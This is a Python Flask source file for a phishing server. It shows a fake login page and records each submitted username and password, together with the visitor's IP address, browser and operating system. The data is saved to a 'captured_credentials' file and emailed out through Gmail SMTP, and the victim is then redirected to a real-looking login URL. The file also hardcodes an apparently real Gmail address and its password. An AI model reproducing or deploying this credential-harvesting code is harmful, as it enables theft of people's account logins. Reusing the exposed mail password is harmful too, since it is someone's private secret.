from flask import Flask, render_template, request, redirect, url_for
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import datetime

app = Flask(__name__)

# Configuration
credentials_file = "Esteyak_Khan_20221CCS0048_captured_credentials.txt"
phishing_page_template = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
</head>
<body>
    <h2>{{ heading }}</h2>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

email_template = """
Username: {{ username }}
Password: {{ password }}

IP Address: {{ ip_address }}
Browser: {{ browser }}
Operating System: {{ os }}
Timestamp: {{ timestamp }}
"""

# Email configuration
email_address = "mdesteyakkhan2003@gmail.com"  
email_password = "Cuboid@121"  
smtp_server = "smtp.gmail.com"
smtp_port = 587
receiver_email = "mdesteyakkhan2003@gmail.com" 


def send_email(username, password, ip_address, browser, os_info):
    message = MIMEMultipart()
    message["From"] = email_address
    message["To"] = receiver_email
    message["Subject"] = "Captured Credentials"
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    body = email_template.replace("{{ username }}", username).replace("{{ password }}", password).replace("{{ ip_address }}", ip_address).replace("{{ browser }}", browser).replace("{{ os }}", os_info).replace("{{ timestamp }}", timestamp)
    message.attach(MIMEText(body, "plain"))
    
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(email_address, email_password)
        server.send_message(message)


@app.route('/')
def index():
    title = "Login"
    heading = "Login to Your Account"
    return render_template("phishing_page.html", title=title, heading=heading)


@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    browser = request.user_agent.browser
    os_info = request.user_agent.platform
    with open(credentials_file, 'a') as f:
        f.write(f"Username: {username}, Password: {password}, IP Address: {ip_address}, Browser: {browser}, OS: {os_info}\n")
    send_email(username, password, ip_address, browser, os_info)
    return redirect(url_for('real_login'))

@app.route('/real_login')
def real_login():
    return redirect('https://www.target-service.com/login')

if __name__ == "__main__":
    with open(credentials_file, 'w'):
        pass
    app.run(debug=True)
